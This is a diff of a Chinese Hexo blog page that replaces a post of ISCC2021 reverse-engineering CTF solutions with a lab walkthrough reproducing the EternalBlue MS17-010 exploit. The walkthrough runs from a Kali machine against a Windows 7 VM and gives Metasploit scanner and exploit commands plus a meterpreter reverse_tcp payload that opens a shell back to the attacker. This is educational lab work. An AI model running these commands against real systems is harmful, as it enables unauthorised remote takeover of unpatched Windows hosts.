@@ -10,7 +10,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>ISCC2021-Re部分题解 | Hexo</title>
+  <title>永恒之蓝 MS17-010 漏洞复现 | Hexo</title>
 
   
     
@@ -704,7 +704,7 @@
         <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
           <script>
             var typed = new Typed("#post-detail-header-title", {
-              strings: ['ISCC2021-Re部分题解'],
+              strings: ['永恒之蓝 MS17-010 漏洞复现'],
               startDelay: 100,
               typeSpeed: 100,
               loop: false,
@@ -729,7 +729,7 @@
       
       <div class="post-meta">
         <i class="fa fa-clock-o" aria-hidden="true"></i>
-        <span class="post-time">2021-06-14</span>
+        <span class="post-time">2021-06-16</span>
       </div>
       
       <div class="post-tags-categories">
@@ -737,16 +737,32 @@
         
       </div>
       <div class="post-content">
-        <p>﻿## ISCC2021 RE wp<br>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
-<h2 id="练武题"><a href="#练武题" class="headerlink" title="练武题"></a>练武题</h2><h2 id="0x00-Garden"><a href="#0x00-Garden" class="headerlink" title="0x00 Garden"></a>0x00 Garden</h2><p><strong>题目描述：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">花园里藏了一个小宝贝，你能找到他吗？</span><br></pre></td></tr></table></figure>
-<p>pyc文件直接反编译然后看源码<br><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">在线工具</a><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607132515425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>异或顺序随便换 但是最后的结果不变，相异为一，相同为零。</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f= <span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;</span></span><br><span class="line"><span class="string">for i in f:</span></span><br><span class="line"><span class="string">     flag+=chr(ord(i)^123)</span></span><br><span class="line"><span class="string">print(flag)</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x01-Analysis"><a href="#0x01-Analysis" class="headerlink" title="0x01  Analysis"></a>0x01  Analysis</h2><p>题目描述：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析就完事了！</span><br></pre></td></tr></table></figure>
-<p>打开IDA分析<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607133006540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>通过字符串 找到关键点：</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607133043817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>进入mix查看：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607133340625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>上脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">cpt = [<span class="number">67</span>,-<span class="number">33</span>,<span class="number">20</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">44</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">8</span>,-<span class="number">4</span>,<span class="number">43</span>,-<span class="number">6</span>,<span class="number">20</span>,<span class="number">23</span>,-<span class="number">7</span>,<span class="number">37</span>,-<span class="number">11</span>,<span class="number">34</span>,<span class="number">61</span>,-<span class="number">50</span>,<span class="number">24</span>,<span class="number">22</span>,<span class="number">10</span>]</span><br><span class="line">mix = [<span class="number">82</span>,<span class="number">69</span>,<span class="number">86</span>,<span class="number">69</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">69</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mix)):</span><br><span class="line">    mix[k] %= <span class="number">64</span> </span><br><span class="line">  <span class="comment">#加密用的密钥都是取余之后的，所以先取余操作</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    <span class="keyword">if</span> mix[n%<span class="number">7</span>] &amp; <span class="number">1</span>:</span><br><span class="line">        cpt[n] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cpt[n] -= <span class="number">1</span></span><br><span class="line">  <span class="comment">#先逆加一和加二      </span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)//<span class="number">2</span>):</span><br><span class="line">    x = cpt[m]</span><br><span class="line">    cpt[m] = cpt[<span class="built_in">len</span>(cpt)-<span class="number">1</span>-m]</span><br><span class="line">    cpt[<span class="built_in">len</span>(cpt)-<span class="number">1</span>-m] = x</span><br><span class="line"> <span class="comment">#对称互换</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    cpt[l] -= mix[l%<span class="number">7</span>]</span><br><span class="line"> <span class="comment">#逆自加，既自减</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    cpt[j] += cpt[j+<span class="number">1</span>]</span><br><span class="line"> <span class="comment">#从后往前，因为最后一个字符是不变的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    cpt[i] += <span class="number">64</span></span><br><span class="line">  <span class="comment">#加回64</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    cpt[i] = <span class="built_in">chr</span>(cpt[i])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(cpt)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+        <p>﻿# 永恒之蓝 MS17-010 漏洞复现<br><font color=#999AAA ></p>
+<font color=#999AAA >
 
+<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
+</font>
+
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<h1 id="何为永恒之蓝？"><a href="#何为永恒之蓝？" class="headerlink" title="何为永恒之蓝？"></a>何为永恒之蓝？</h1><p><font color=#999AAA ></font></p>
+<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
+
+<p><font color=#999AAA >永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
+<h1 id="一、什么是SMB协议"><a href="#一、什么是SMB协议" class="headerlink" title="一、什么是SMB协议"></a>一、什么是SMB协议</h1><p><font color=#999AAA >SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
+<h2 id="SMB工作原理是什么？"><a href="#SMB工作原理是什么？" class="headerlink" title="SMB工作原理是什么？"></a>SMB工作原理是什么？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）：首先客户端发送一个SMB negport 请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</span><br><span class="line"></span><br><span class="line">     （<span class="number">2</span>）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接。</span><br><span class="line"></span><br><span class="line">      （<span class="number">3</span>）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</span><br><span class="line"></span><br><span class="line">      （<span class="number">4</span>）：连接到相应资源后，SMB客户端就能够通过<span class="built_in">open</span> SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、实验环境："><a href="#二、实验环境：" class="headerlink" title="二、实验环境："></a>二、实验环境：</h1><p>1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机）<br>2.设置kali 的IP地址为自动获取，查看kali  IP地址：ifconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131421195.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看到kali 的IP地址是<strong>192.168.127.131</strong><br>3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131501939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见windows 7 的IP地址为<strong>192.168.127.134</strong></p>
+<h1 id="三、实验步骤："><a href="#三、实验步骤：" class="headerlink" title="三、实验步骤："></a>三、实验步骤：</h1><p>1.测试两台主机的连通性：用kali 去Ping windows 7的主机，来测试连通性：<code>ping 192.168.127.134</code>  <strong>（记得关掉靶机的防火墙）</strong><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2021061613170094.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见两台主机连通性良好<br>2.查看kali 主机数据库是否开启：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131723734.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：Active：inactive （dead）说明数据库此时是关闭的；</p>
+<p>3.打开kali 主机的数据库： <code>service postgresql start</code></p>
+<p>4.再次查看kali 主机的数据库：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131754963.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：<code>Active：active （exited）</code>说明此时数据库已经打开</p>
+<p>5.进行msfdb 数据库初始化，配置数据库相关信息：<code>msfdb init</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131822701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>此时就可以进行永恒之蓝漏洞扫描，（<strong>永恒之蓝利用的是ms17_010漏洞，因此到这一步之后的任务就是在kali 里寻找ms17_010漏洞，并且利用该漏洞进行攻击，获得windows 7 的管理员权限</strong>）<br>6.启动msf：<code>msfconsole</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131917773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>这样就成功进入了msf中，（<strong>每个人每次进去都会有不同的界面出现）</strong></p>
+<p>7.查看数据库连接情况：在msf命令提示符下：<code>db_status</code>(下面的msf命令提示符也说明了已经进入了msf中)<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132008669.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><code>postgresql connected to msf</code> 说明已经成功连接到了<code>msf</code><br>8.搜索ms17_010:<code>search ms17_010</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132116915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>如果多次还是没有发现上述界面，那么有可能是kali 版本太低，没有ms17_010漏洞，所以建议安装更新版本的kali</strong><br>9.使用ms17_010模块进行漏洞扫描<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132206274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>扫描命令：<code>use auxiliary/scanner/smb/smb_ms17_010</code><br>攻击命令（后面使用）：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132303192.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong><em>10.如果不知道应该使用什么命令，则输入options来获得帮助</em></strong></p>
+<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132324419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>在此，只关注两个命令：RHOSTS和THREADS，RHOSTS是要扫描的主机（主机段），THREADS是线程，默认是1，开始使用线程加快扫描</strong><br>11.设置扫描的主机或者主机段（由于靶机IP地址是192.168.127.134，因此设置扫描主机段为192.168.127.131/24）：set rhosts 192.168.223.141/24;然后设置扫描线程为20；最后输入run执行扫描。<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132453511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>12.进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132515521.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置攻击目标（靶机）：<span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.134</span></span><br><span class="line"></span><br><span class="line">设置攻击载荷：<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">设置监听主机（kali）：<span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
+<p>利用exploit进行攻击：exploit<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132605398.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132722915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>①：表示永恒之蓝覆盖成功完成<br>②：目标主机和攻击机建立了了一个shell连接，会话为session 1<br>③：得到一个meterpreter会话，尝试获取shell失败<br>④：在meterpreter会话下输入ps就能获得目标主机的当前进程<br>注： meterpreter是metasploit框架中的一个扩展模块，是后渗透攻击中的杀手锏，使用meterpreter作为攻击载荷，建立连接后可以对目标系统进行更深入的渗透，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908293">meterpreter模块之后渗透攻击</a><br><strong>到这里漏洞攻击已经成功，接下来要做的就是后渗透攻击，涉及到权限提升，跳板攻击，密码哈希值获取，获取shell以及其他更多信息</strong><br>参考优秀文章如下：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/104044002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162382014616780265486845%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162382014616780265486845&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-104044002.pc_search_result_cache&utm_term=%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1018.2226.3001.4187">永恒之蓝漏洞复现</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908131">永恒之蓝漏洞复现</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这次复现学习了不少知识 学不会的东西可以多查一查文章 多试试  有时候不知道哪里错啦 可以去问一问这方面的师父 但是通过自己来解决问题的时候  感觉是很不一样的！<br>附上windows7的镜像</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1TWDS_VJO2LOqlKniR__4uA </span><br><span class="line">提取码：more </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦</span><br></pre></td></tr></table></figure>
 
       </div>
       
@@ -757,7 +773,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2021/06/14/ISCC2021-Re部分题解/" target="_blank" title="ISCC2021-Re部分题解">http://example.com/2021/06/14/ISCC2021-Re部分题解/</a>
+    <a href="/2021/06/16/永恒之蓝 MS17-010 漏洞复现/" target="_blank" title="永恒之蓝 MS17-010 漏洞复现">http://example.com/2021/06/16/永恒之蓝 MS17-010 漏洞复现/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -775,47 +791,22 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img lazyload" data-original="/medias/8.jpg" style="background-size: cover; 
-      background-position: center center;">
-    </div>
-    <a href="/2021/06/16/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-nav-link">
-      <div class="title">
-        <i class="fa fa-angle-left"></i> Prev:
-        <div>永恒之蓝 MS17-010 漏洞复现</div>
-      </div>
-      
-      <!-- <div class="content">
-        ﻿# 永恒之蓝 MS17-010 漏洞复现
-
-
-@TOC
-
-
-
-
-永恒之蓝（Eternal Blue）爆发于2017年4
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img lazyload" data-original="/medias/11.jpg" style="background-size: cover; 
+    <div class="post-nav-img lazyload" data-original="/medias/8.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/06/10/ISCC2021%20MISC%20wp/" class="post-nav-link">
+    <a href="/2021/06/14/ISCC2021-Re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="post-nav-link">
       <div class="title">
         Next: <i class="fa fa-angle-right"></i>
-        <div>ISCC2021 MISC wp</div>
+        <div>ISCC2021-Re部分题解</div>
       </div>
       <!-- <div class="content">
-        ﻿## ISCC2021 MISC wp@TOC
-练武题0x00 Retrieve the passcode题目描述：
-
+        ﻿## ISCC2021 RE wp@TOC
+练武题0x00 Garden题目描述：
+1花园里藏了一个小宝贝，你能找到他
       </div> -->
     </a>
   </div>
